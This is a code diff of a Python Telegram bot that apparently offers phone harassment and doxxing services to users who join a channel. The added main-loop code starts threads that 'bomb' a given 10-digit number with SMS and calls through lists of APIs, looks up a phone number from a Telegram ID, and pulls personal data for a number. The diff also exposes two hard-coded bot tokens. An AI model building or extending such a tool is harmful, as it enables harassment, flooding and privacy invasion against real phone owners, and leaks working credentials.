@@ -1,5 +1,5 @@
 # Telegram Bot Token
-BOT_TOKEN = "8658828312:AAGB3YHK0h6BurWyw_-YQi-qREdRr9R08c8"
+BOT_TOKEN = "8106557982:AAF4gGDaoGecPPpt3FzkiXJfkfwI6fqW9Rs"
 
 # Channel Link (Jisko join karna hoga)
 CHANNEL_LINK = "https://t.me/+7iU_0FqOQPExZWFl"
@@ -601,44 +601,44 @@ def handle_message(chat_id, text, username, first_name, user_states):
     
     return None
 # ======================================================
-# 🚀 MAIN FUNCTION (OPTIMIZED + FIXED)
+# 🚀 MAIN FUNCTION
 # ======================================================
 def main():
     load_data()
-
+    
     print("=" * 50)
     print("🔥 BOT STARTED SUCCESSFULLY 🔥")
     print("=" * 50)
+    
+    # ✅ FIXED (OWNER_ID ➝ OWNER_IDS)
     print(f"👑 OWNER IDs: {', '.join(OWNER_IDS)}")
+    
+    print(f"✅ VERIFIED USERS: {len(verified_users)}")
+    print(f"💣 SMS APIs: {len(SMS_APIS)}")
+    print(f"📞 CALL APIs: {len(CALL_APIS)}")
     print(f"📢 CHANNEL: {CHANNEL_LINK}")
     print("=" * 50)
     print("🚀 BOT IS RUNNING...")
     print("=" * 50)
-
+    
     last_update_id = 0
     user_states = {}
-
+    
     while True:
         try:
-            # ⚡ FAST POLLING (optimized)
             updates = get_updates(last_update_id + 1 if last_update_id else None)
-
+            
             for update in updates:
-
-                # 🔥 FIX: prevents duplicate messages
-                last_update_id = update.get("update_id") + 1
-
+                last_update_id = update.get("update_id")
                 message = update.get("message")
                 callback = update.get("callback_query")
-
-                # =========================
-                # 🔁 CALLBACK HANDLER
-                # =========================
+                
+                # Handle callback (VERIFY button)
                 if callback:
                     chat_id = callback.get("message", {}).get("chat", {}).get("id")
                     message_id = callback.get("message", {}).get("message_id")
                     data = callback.get("data", "")
-
+                    
                     if data == "verify":
                         if check_user_in_channel(chat_id):
                             verified_users.add(chat_id)
@@ -648,41 +648,106 @@ def main():
                             edit_message(
                                 chat_id,
                                 message_id,
-                                get_welcome_message("User") + "\n\n❌ Join channel first!",
+                                get_welcome_message("User") + "\n\n❌ Verification Failed! Please join channel first.",
                                 verify_keyboard()
                             )
-
-                # =========================
-                # 💬 MESSAGE HANDLER
-                # =========================
+                
+                # Handle text messages
                 elif message:
                     chat_id = message.get("chat", {}).get("id")
                     text = message.get("text", "")
                     username = message.get("from", {}).get("username", "")
                     first_name = message.get("from", {}).get("first_name", "User")
-
+                    
                     state = user_states.get(chat_id, "")
-
+                    
                     # =========================
-                    # ⚡ NORMAL FLOW (FAST)
+                    # ✅ STATE HANDLING
                     # =========================
-                    new_state = handle_message(chat_id, text, username, first_name, user_states)
-
-                    if new_state:
-                        user_states[chat_id] = new_state
-                    elif state:
+                    
+                    if state == "awaiting_sms_bomb" and text.isdigit() and len(text) == 10:
+                        if chat_id in bombing_active and bombing_active[chat_id]:
+                            send_message(chat_id, "❌ Already bombing! Use STOP BOMB first.")
+                            user_states[chat_id] = ""
+                            continue
+                        
+                        send_message(chat_id, get_bomb_start_message("sms", text, len(SMS_APIS)))
+                        
+                        thread = threading.Thread(target=bombing_worker, args=(chat_id, text, "sms"))
+                        thread.daemon = True
+                        thread.start()
+                        
                         user_states[chat_id] = ""
-
-            # ⚡ ULTRA FAST LOOP DELAY
-            time.sleep(0.1)
-
+                        continue
+                    
+                    elif state == "awaiting_call_bomb" and text.isdigit() and len(text) == 10:
+                        if chat_id in bombing_active and bombing_active[chat_id]:
+                            send_message(chat_id, "❌ Already bombing! Use STOP BOMB first.")
+                            user_states[chat_id] = ""
+                            continue
+                        
+                        send_message(chat_id, get_bomb_start_message("call", text, len(CALL_APIS)))
+                        
+                        thread = threading.Thread(target=bombing_worker, args=(chat_id, text, "call"))
+                        thread.daemon = True
+                        thread.start()
+                        
+                        user_states[chat_id] = ""
+                        continue
+                    
+                    elif state == "awaiting_tgid" and text.isdigit():
+                        send_message(chat_id, "🆔 FETCHING PHONE NUMBER...")
+                        result = tgid_to_number_api(text)
+                        
+                        if result:
+                            send_message(
+                                chat_id,
+                                get_tgid_result(text, result.get('number'), result.get('country', 'India')),
+                                main_keyboard()
+                            )
+                        else:
+                            send_message(chat_id, f"❌ Failed to fetch number for ID: {text}", main_keyboard())
+                        
+                        user_states[chat_id] = ""
+                        continue
+                    
+                    elif state == "awaiting_number" and text.isdigit() and len(text) == 10:
+                        send_message(chat_id, "🔍 FETCHING INFORMATION...")
+                        
+                        if text in cache:
+                            data = cache[text]
+                        else:
+                            data = number_lookup_api(text)
+                            if not data:
+                                data = number_lookup_backup(text)
+                            cache[text] = data
+                        
+                        if data and isinstance(data, list) and len(data) > 0:
+                            send_message(chat_id, get_number_lookup_result(text, data), main_keyboard())
+                        else:
+                            send_message(chat_id, f"❌ No data found for {text}", main_keyboard())
+                        
+                        user_states[chat_id] = ""
+                        continue
+                    
+                    # =========================
+                    # NORMAL FLOW
+                    # =========================
+                    
+                    else:
+                        new_state = handle_message(chat_id, text, username, first_name, user_states)
+                        
+                        if new_state:
+                            user_states[chat_id] = new_state
+                        elif state:
+                            user_states[chat_id] = ""
+            
+            time.sleep(0.5)
+            
         except Exception as e:
             print(f"Error: {e}")
-            time.sleep(2)
+            time.sleep(5)
 
 
-# ======================================================
-# 🚀 START BOT
-# ======================================================
 if __name__ == "__main__":
     main()
